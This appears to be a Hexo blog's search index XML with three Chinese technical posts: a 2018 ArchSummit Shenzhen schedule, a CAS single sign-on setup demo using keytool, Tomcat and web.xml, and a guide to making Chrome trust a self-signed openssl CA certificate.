<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>ArchSummit日程</title>
    <url>/technology/2018/07/ArchSummit%E6%97%A5%E7%A8%8B/</url>
    <content><![CDATA[<blockquote>
<p><a href="https://sz2018.archsummit.com/schedule">ArchSummit 全球架构师峰会日程</a></p>
</blockquote>
<h1 id="会议-·-第一天-2018-07-06-周五"><a href="#会议-·-第一天-2018-07-06-周五" class="headerlink" title="会议 · 第一天(2018&#x2F;07&#x2F;06 周五)"></a>会议 · 第一天(2018&#x2F;07&#x2F;06 周五)</h1><h2 id="上午"><a href="#上午" class="headerlink" title="上午"></a>上午</h2><ul>
<li><code>09:15-10:00</code> <code>巴塞罗那厅</code> <a href="https://sz2018.archsummit.com/presentation/704">演讲：微服务——构建持续交付与DevOps架构</a> 陈连平 &#x2F; 独立研究员、顾问</li>
<li><code>10:00-10:45</code> <code>马德里5号厅</code> <a href="https://sz2018.archsummit.com/presentation/750">演讲：基于容器化CI&#x2F;CD平台的持续集成和部署实践</a> 宫静 七牛云 &#x2F; 技术专家</li>
<li><code>10:45-11:30</code> <code>马德里5号厅</code> <a href="https://sz2018.archsummit.com/presentation/752">面向机器学习数据平台的设计与搭建</a> 袁凯 个推 &#x2F; 首席数据架构师</li>
<li><code>11:30-12:15</code> <code>巴塞罗那厅</code> <a href="https://sz2018.archsummit.com/presentation/761">谷歌云全球分布式系统架构设计在游戏产业的实践</a> James Wu Google Cloud &#x2F; Customer Engineer</li>
</ul>
<h2 id="下午"><a href="#下午" class="headerlink" title="下午"></a>下午</h2><ul>
<li><code>13:45-14:30</code> <code>大宴会厅1</code> <a href="https://sz2018.archsummit.com/presentation/500">Istio-构造、守护、监控微服务的守护神 (英语演讲)</a> Lin Sun IBM &#x2F; Senior Technical Staff Member </li>
<li><code>14:40-15:25</code>  <code>大宴会厅1</code> <a href="https://sz2018.archsummit.com/presentation/697">玩转Envoy 落地自研Service Mesh</a> 殷湘 思源 &#x2F; 高级架构专家 </li>
<li><code>15:40-16:25</code> <code>大宴会厅1</code> <a href="https://sz2018.archsummit.com/presentation/404">贝聊微服务架构实战历程</a> 杨钦民 贝聊 &#x2F; 技术顾问</li>
<li><code>16:35-17:20</code> <code>大宴会厅1</code> <a href="https://sz2018.archsummit.com/presentation/487">微服务架构下的效率提升实践</a> 王汶东 51信用卡 &#x2F; 研发技术总监</li>
<li><code>18:30-21:00</code> <code>巴塞罗那厅</code> <a href="https://www.bagevent.com/event/1559589?bag_track=AS">ArchSummit特色晚场｜UCloud UCan技术夜——新生代特别之夜</a> </li>
<li><code>18:30-21:00</code> <code>大宴会厅2</code> <a href="https://www.bagevent.com/event/1590965?bag_track=web">ArchSummit技术晚场 | 蚂蚁金服围炉夜话：云原生架构探讨</a></li>
</ul>
<h1 id="会议-·-第二天-2018-07-07-周六"><a href="#会议-·-第二天-2018-07-07-周六" class="headerlink" title="会议 · 第二天(2018&#x2F;07&#x2F;07 周六)"></a>会议 · 第二天(2018&#x2F;07&#x2F;07 周六)</h1><h2 id="上午-1"><a href="#上午-1" class="headerlink" title="上午"></a>上午</h2><ul>
<li><code>09:00-09:45</code> <code>巴塞罗那厅</code> <a href="https://sz2018.archsummit.com/presentation/452">深度学习在大规模推荐系统中的应用</a> Dekun Zou Google &#x2F; 资深研发工程师 </li>
<li><code>10:00-10:45</code> <code>马德里3号厅</code> <a href="https://sz2018.archsummit.com/presentation/625">余额宝大规模服务化的技术创新</a> 李鑫 天弘基金（余额宝） &#x2F; 移动平台技术总监 &amp; 首席架构师</li>
<li><code>11:00-11:45</code> <code>马德里3号厅 </code> <a href="https://sz2018.archsummit.com/presentation/711">陆金所互金平台异步消息系统实践</a> 李貌 陆金所 &#x2F; 架构师</li>
</ul>
<h2 id="下午-1"><a href="#下午-1" class="headerlink" title="下午"></a>下午</h2><ul>
<li><code>13:30-14:15</code> <code>大宴会厅2 </code> <a href="https://sz2018.archsummit.com/presentation/391">机器学习技术在安全性和完整性方面的探索</a> 徐斌 Facebook &#x2F; Software Engineer Manager</li>
<li><code>14:30-15:15</code> <code>大宴会厅1</code> <a href="https://sz2018.archsummit.com/presentation/554">大道至简 - 严选售后服务架构演变实践</a> 马超 网易 &#x2F; 严选技术经理 </li>
<li><code>15:35-16:20</code> <code>大宴会厅1</code> <a href="https://sz2018.archsummit.com/presentation/522">全球跨域RPC架构</a> 高良 菜鸟网络 &#x2F; 互联平台&#x2F;技术主管</li>
<li><code>16:35-17:20</code> <code>巴塞罗那厅 </code> <a href="https://sz2018.archsummit.com/presentation/611">下一代分布式体系架构的理念与演进</a> 黄浩 菜鸟网络 &#x2F; 资深技术专家</li>
</ul>
<h1 id="培训-2018-07-08-09-周日-周一"><a href="#培训-2018-07-08-09-周日-周一" class="headerlink" title="培训(2018&#x2F;07&#x2F;08-09 周日 &#x2F; 周一)"></a>培训(2018&#x2F;07&#x2F;08-09 周日 &#x2F; 周一)</h1><blockquote>
<p>  无法逗留记得找事后关注资料</p>
</blockquote>
<ul>
<li><code>07月09日 上午</code> <code>深圳·华侨城洲际酒店 马德里3</code> <a href="https://sz2018.archsummit.com/training/641">微服务治理的探索与实践</a> 李鑫 天弘基金（余额宝） &#x2F; 移动平台技术总监 &amp; 首席架构师</li>
</ul>
]]></content>
      <categories>
        <category>technology</category>
      </categories>
      <tags>
        <tag>架构</tag>
        <tag>ArchSummit</tag>
      </tags>
  </entry>
  <entry>
    <title>CAS协议实践之基础demo</title>
    <url>/technology/2017/08/CAS%E5%8D%8F%E8%AE%AE%E5%AE%9E%E8%B7%B5%E4%B9%8B%E5%9F%BA%E7%A1%80demo/</url>
    <content><![CDATA[<blockquote>
<p> 资源下载</p>
</blockquote>
<p><a href="http://developer.jasig.org/cas/">CAS server</a></p>
<p><a href="http://developer.jasig.org/cas-clients/">CAS client</a></p>
<h2 id="一、CAS-server"><a href="#一、CAS-server" class="headerlink" title="一、CAS server"></a>一、CAS server</h2><h3 id="1-生成证书"><a href="#1-生成证书" class="headerlink" title="1. 生成证书"></a>1. 生成证书</h3><p>生成一个别名为castest的证书。</p>
<p>此处需要特别注意口令（后续导入导出证书、CAS服务器端均要用到此口令）和“名字与姓氏”（为CAS跳转域名，否则会报错）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">keytool -genkey -alias castest -keyalg RSA -keystore &#123;certificate_path&#125;/&#123;certificate_name&#125;</span><br></pre></td></tr></table></figure>

<p><img src="http://img.willowspace.cn/willowspace_2016/1491722131911.png"></p>
<h3 id="2-导出证书"><a href="#2-导出证书" class="headerlink" title="2. 导出证书"></a>2. 导出证书</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">keytool -export -file &#123;certificate_path&#125;/&#123;certificate_name&#125;.crt -alias castest -keystore &#123;certificate_path&#125;/&#123;certificate_name&#125;</span><br></pre></td></tr></table></figure>

<p><img src="http://img.willowspace.cn/willowspace_2016/1491722611795.png"></p>
<h3 id="3-安装证书"><a href="#3-安装证书" class="headerlink" title="3. 安装证书"></a>3. 安装证书</h3><p>将证书导入到客户端JRE中（注意、是导入JRE中），如果security中已经存在cacerts，需要先将其删除。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">keytool -import -keystore &quot;&#123;jdk_path&#125;\jre\lib\security\cacerts&quot; -file &#123;certificate_path&#125;/cas-test.crt -alias cas-test</span><br></pre></td></tr></table></figure>

<p><img src="http://img.willowspace.cn/willowspace_2016/1491724570498.png"></p>
<h3 id="4-配置tomcat"><a href="#4-配置tomcat" class="headerlink" title="4. 配置tomcat"></a>4. 配置tomcat</h3><p>修改%TOMCAT_HOME%&#x2F;conf&#x2F;server.xml文件，支持https证书访问</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Connector</span> <span class="attr">SSLEnabled</span>=<span class="string">&quot;true&quot;</span> <span class="attr">clientAuth</span>=<span class="string">&quot;false&quot;</span> <span class="attr">keystoreFile</span>=<span class="string">&quot;&#123;certificate_path&#125;/&#123;certificate_name&#125;&quot;</span> </span></span><br><span class="line"><span class="tag"><span class="attr">keystorePass</span>=<span class="string">&quot;&#123;certificate_password&#125;&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">maxThreads</span>=<span class="string">&quot;150&quot;</span> <span class="attr">port</span>=<span class="string">&quot;8443&quot;</span> <span class="attr">protocol</span>=<span class="string">&quot;org.apache.coyote.http11.Http11Protocol&quot;</span> <span class="attr">scheme</span>=<span class="string">&quot;https&quot;</span> <span class="attr">secure</span>=<span class="string">&quot;true&quot;</span> <span class="attr">sslProtocol</span>=<span class="string">&quot;TLS&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="http://img.willowspace.cn/willowspace_2016/1491725915837.png"></p>
<h3 id="5-测试证书"><a href="#5-测试证书" class="headerlink" title="5. 测试证书"></a>5. 测试证书</h3><p>访问<a href="https://localhost:8443/%EF%BC%8C%E6%88%90%E5%8A%9F%E5%88%99%E8%AF%B4%E6%98%8E%E9%85%8D%E7%BD%AE%E8%AF%81%E4%B9%A6%E6%88%90%E5%8A%9F">https://localhost:8443/，成功则说明配置证书成功</a></p>
<h3 id="6-部署CAS-server"><a href="#6-部署CAS-server" class="headerlink" title="6. 部署CAS server"></a>6. 部署CAS server</h3><p>从<a href="http://developer.jasig.org/cas/%E4%B8%8A%E4%B8%8B%E8%BD%BDcas%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AFcas-server-4.0.0-release.zip%EF%BC%8C%E5%9C%A8modules%E7%9B%AE%E5%BD%95%E4%B8%8B%E6%89%BE%E5%88%B0cas-server-webapp-4.0.0.war%EF%BC%8C%E5%B0%86%E5%85%B6%E5%A4%8D%E5%88%B6%E5%88%B0%TOMCAT_HOME%/webapps%E4%B8%8B%EF%BC%8C%E5%B9%B6%E5%B0%86%E5%90%8D%E7%A7%B0%E6%94%B9%E4%B8%BAcas.war">http://developer.jasig.org/cas/上下载cas服务器端cas-server-4.0.0-release.zip，在modules目录下找到cas-server-webapp-4.0.0.war，将其复制到%TOMCAT_HOME%\webapps下，并将名称改为cas.war</a></p>
<h3 id="7-测试CAS-server"><a href="#7-测试CAS-server" class="headerlink" title="7. 测试CAS server"></a>7. 测试CAS server</h3><p>输入账号和密码</p>
<ul>
<li>casuser</li>
<li>Mellon</li>
</ul>
<p><img src="http://img.willowspace.cn/willowspace_2016/1491727396249.png"></p>
<p>登录成功则说明CAS server配置成功，可通过<a href="https://localhost:8443/logout%E9%80%80%E5%87%BA%E7%99%BB%E5%BD%95">https://localhost:8443/logout退出登录</a></p>
<h2 id="二、CAS-client"><a href="#二、CAS-client" class="headerlink" title="二、CAS client"></a>二、CAS client</h2><h3 id="1-添加证书映射域名"><a href="#1-添加证书映射域名" class="headerlink" title="1. 添加证书映射域名"></a>1. 添加证书映射域名</h3><figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">127.0.0.1</span> <span class="string">sso.cas.com</span></span><br></pre></td></tr></table></figure>

<h3 id="2-创建CAS-client项目"><a href="#2-创建CAS-client项目" class="headerlink" title="2. 创建CAS client项目"></a>2. 创建CAS client项目</h3><p>配置web.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Archetype Created Web Application<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 用于单点退出，该过滤器用于实现单点登出功能，可选配置--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.jasig.cas.client.session.SingleSignOutHttpSessionListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 该过滤器用于实现单点登出功能，可选配置。 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CAS Single Sign Out Filter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.jasig.cas.client.session.SingleSignOutFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CAS Single Sign Out Filter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 该过滤器负责用户的认证工作，必须启用它 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CASFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.jasig.cas.client.authentication.AuthenticationFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>casServerLoginUrl<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>https://sso.cas.com:8443/cas-server-webapp-4.0.0/login<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--这里的server是服务端的IP--&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>serverName<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>http://localhost:8081<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CASFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 该过滤器负责对Ticket的校验工作，必须启用它 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CAS Validation Filter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span></span><br><span class="line">            org.jasig.cas.client.validation.Cas20ProxyReceivingTicketValidationFilter</span><br><span class="line">        <span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>casServerUrlPrefix<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>https://sso.cas.com:8443/cas-server-webapp-4.0.0/</span><br><span class="line">            <span class="tag">&lt;/<span class="name">param-value</span>&gt;</span><span class="comment">&lt;!-- 此处必须为登录url/cas/，带有任何其它路径都会报错，如“https://sso.castest.com:8443/cas/login”,这样也会报错。 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>serverName<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>http://localhost:8081<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CAS Validation Filter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">            该过滤器负责实现HttpServletRequest请求的包裹，</span></span><br><span class="line"><span class="comment">            比如允许开发者通过HttpServletRequest的getRemoteUser()方法获得SSO登录用户的登录名，可选配置。</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CAS HttpServletRequest Wrapper Filter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span></span><br><span class="line">            org.jasig.cas.client.util.HttpServletRequestWrapperFilter</span><br><span class="line">        <span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CAS HttpServletRequest Wrapper Filter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">            该过滤器使得开发者可以通过org.jasig.cas.client.util.AssertionHolder来获取用户的登录名。</span></span><br><span class="line"><span class="comment">            比如AssertionHolder.getAssertion().getPrincipal().getName()。</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CAS Assertion Thread Local Filter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.jasig.cas.client.util.AssertionThreadLocalFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CAS Assertion Thread Local Filter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- session超时定义,单位为分钟 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">session-config</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">session-timeout</span>&gt;</span>2<span class="tag">&lt;/<span class="name">session-timeout</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">session-config</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="2-导入CAS-client核心jar包"><a href="#2-导入CAS-client核心jar包" class="headerlink" title="2. 导入CAS client核心jar包"></a>2. 导入CAS client核心jar包</h3><p>从<a href="http://developer.jasig.org/cas-clients/%E4%B8%8A%E4%B8%8B%E8%BD%BDcas-client-3.1.12-release.zip%EF%BC%8C%E5%9C%A8modules%E7%9B%AE%E5%BD%95%E4%B8%8B%E6%89%BE%E5%88%B0cas-client-core-3.1.12.jar%E3%80%81commons-collections-3.2.jar%E3%80%81commons-logging-1.1.jar%E5%A4%8D%E5%88%B6%E5%88%B0%E9%A1%B9%E7%9B%AEWEB-INF/lib%E4%B8%8B">http://developer.jasig.org/cas-clients/上下载cas-client-3.1.12-release.zip，在modules目录下找到cas-client-core-3.1.12.jar、commons-collections-3.2.jar、commons-logging-1.1.jar复制到项目WEB-INF/lib下</a></p>
<h3 id="3-测试CAS-client"><a href="#3-测试CAS-client" class="headerlink" title="3. 测试CAS client"></a>3. 测试CAS client</h3><p>配置好web容器后，启动cas client，访问<a href="http://localhost:8081/index.jsp%EF%BC%8C%E9%87%8D%E5%AE%9A%E5%90%91%E8%87%B3cas">http://localhost:8081/index.jsp，重定向至cas</a> server(<a href="https://sso.cas.com:8443)认证页面，输入用户名casuser及密码Mellon，认证成功后跳回访问页。同时可以在CAS">https://sso.cas.com:8443)认证页面，输入用户名casuser及密码Mellon，认证成功后跳回访问页。同时可以在CAS</a> server日志上看到如下的验证信息</p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1491750286473.png"></p>
<p>访问<a href="https://sso.cas.com:8443/cas-server-webapp-4.0.0/logout%E5%8F%AF%E4%BB%A5%E9%80%80%E5%87%BA%E5%8D%95%E7%82%B9%E7%99%BB%E5%BD%95">https://sso.cas.com:8443/cas-server-webapp-4.0.0/logout可以退出单点登录</a></p>
<h2 id="三、其他认证方式"><a href="#三、其他认证方式" class="headerlink" title="三、其他认证方式"></a>三、其他认证方式</h2><p>以上验证的用户名和密码是配置在{CAS_server}&#x2F;webapp&#x2F;WEB-INF&#x2F;deployerConfigContext.xml中的</p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1491750718948.png"></p>
<p>实际生产中用户认证信息往往配置在数据库中，下面介绍利用数据库配置认证方式</p>
<p><a href="http://www.cnblogs.com/rwxwsblog/p/4954843.html">配置数据库认证方式</a></p>
<h2 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h2><h3 id="1-service是如何存储的"><a href="#1-service是如何存储的" class="headerlink" title="1. service是如何存储的"></a>1. service是如何存储的</h3><p><a href="https://wiki.jasig.org/display/casc/configuring+the+jasig+cas+client+for+java+in+the+web.xml">Configuring CAS client for java in the web.xml</a></p>
]]></content>
      <categories>
        <category>technology</category>
      </categories>
      <tags>
        <tag>架构</tag>
        <tag>java</tag>
        <tag>sso</tag>
        <tag>cas</tag>
      </tags>
  </entry>
  <entry>
    <title>Chrome信任自签数字证书</title>
    <url>/technology/2018/10/Chrome%E4%BF%A1%E4%BB%BB%E8%87%AA%E7%AD%BE%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/</url>
    <content><![CDATA[<h1 id="Chrome信任自签数字证书"><a href="#Chrome信任自签数字证书" class="headerlink" title="Chrome信任自签数字证书"></a>Chrome信任自签数字证书</h1><h2 id="如何自签一个CA证书和一个子证书"><a href="#如何自签一个CA证书和一个子证书" class="headerlink" title="如何自签一个CA证书和一个子证书"></a>如何自签一个CA证书和一个子证书</h2><ol>
<li>创建CA配置文件</li>
</ol>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">touch localhost_ca.cnf</span><br><span class="line"></span><br><span class="line">[ req ]</span><br><span class="line">distinguished_name  = req_distinguished_name</span><br><span class="line">x509_extensions     = root_ca</span><br><span class="line"></span><br><span class="line">[ req_distinguished_name ]</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">以下内容可随意填写</span></span><br><span class="line">countryName             = CN (2 letter code)</span><br><span class="line">countryName_min         = 2</span><br><span class="line">countryName_max         = 2</span><br><span class="line">stateOrProvinceName     = ZheJiang</span><br><span class="line">localityName            = HangZhou</span><br><span class="line">organizationName        = Dxy</span><br><span class="line">organizationalUnitName  = technology</span><br><span class="line">commonName              = develop</span><br><span class="line">commonName_max          = 64</span><br><span class="line">emailAddress            = yangw@dxy.cn</span><br><span class="line">emailAddress_max        = 64</span><br><span class="line"></span><br><span class="line">[ root_ca ]</span><br><span class="line">basicConstraints        = critical, CA:true</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>创建扩展配置文件</li>
</ol>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">touch localhost_ca.ext</span><br><span class="line"></span><br><span class="line">subjectAltName = @alt_names</span><br><span class="line">extendedKeyUsage = serverAuth</span><br><span class="line"></span><br><span class="line">[alt_names]</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">域名，如有多个用DNS.2,DNS.3…来增加</span></span><br><span class="line">DNS.1 = a.domain.cn</span><br><span class="line">DNS.2 = b.domain.cn</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">IP地址</span></span><br><span class="line">IP.1 = 192.168.0.1</span><br><span class="line">IP.2 = 127.0.0.1</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>创建CA证书私钥及CA证书</li>
</ol>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl req -x509 -newkey rsa:2048 -out $CA_CER_NAME.cer -outform PEM -keyout $CA_KEY_NAME.pvk -days 10000 -verbose -config $CA_CNF_FILE -nodes -sha256 -subj &quot;/CN=$CA_CER_NAME&quot;</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>创建子证书私钥</li>
</ol>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl req -newkey rsa:2048 -keyout $KEY_NAME.pvk -out $CER_NAME.req -subj /CN=$CA_CER_NAME -sha256 -nodes</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>创建子证书</li>
</ol>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl x509 -req -CA $CA_CER_NAME.cer -CAkey $CA_KEY_NAME.pvk -in $CER_NAME.req -out $CER_NAME.cer -days 10000 -extfile $CA_EXT_FILE -sha256 -set_serial 0x1111</span><br></pre></td></tr></table></figure>

<blockquote>
<p>可以做成脚本以便复用</p>
</blockquote>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/zsh</span></span><br><span class="line">CA_CER_NAME=localhost_ca</span><br><span class="line">CA_KEY_NAME=localhost_ca</span><br><span class="line">CA_CNF_FILE=./localhost_ca.cnf</span><br><span class="line">CA_EXT_FILE=./localhost_ca.ext</span><br><span class="line"></span><br><span class="line">CER_NAME=localhost</span><br><span class="line">KEY_NAME=localhost</span><br><span class="line"></span><br><span class="line">openssl req -x509 -newkey rsa:2048 -out $CA_CER_NAME.cer -outform PEM -keyout $CA_KEY_NAME.pvk -days 10000 -verbose -config $CA_CNF_FILE -nodes -sha256 -subj &quot;/CN=$CA_CER_NAME&quot;</span><br><span class="line"></span><br><span class="line">openssl req -newkey rsa:2048 -keyout $KEY_NAME.pvk -out $CER_NAME.req -subj /CN=$CA_CER_NAME -sha256 -nodes</span><br><span class="line"></span><br><span class="line">openssl x509 -req -CA $CA_CER_NAME.cer -CAkey $CA_KEY_NAME.pvk -in $CER_NAME.req -out $CER_NAME.cer -days 10000 -extfile $CA_EXT_FILE -sha256 -set_serial 0x1111</span><br></pre></td></tr></table></figure>


<h2 id="Chrome如何信任自签证书"><a href="#Chrome如何信任自签证书" class="headerlink" title="Chrome如何信任自签证书"></a>Chrome如何信任自签证书</h2><ol>
<li>chrome:&#x2F;&#x2F;settings进入Chrome设置界面,搜索certificate,找到并点击Manage certificates将进入系统Keychain Access</li>
<li>将生成CA(.cer)证书导入</li>
<li>将导入后的CA证书设置成always trust</li>
</ol>
<h2 id="一些证书使用场景"><a href="#一些证书使用场景" class="headerlink" title="一些证书使用场景"></a>一些证书使用场景</h2><h3 id="pem格式转cer格式"><a href="#pem格式转cer格式" class="headerlink" title="pem格式转cer格式"></a>pem格式转cer格式</h3>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl x509 -inform PEM -in cacert.pem -outform DER -out certificate.cer</span><br></pre></td></tr></table></figure>

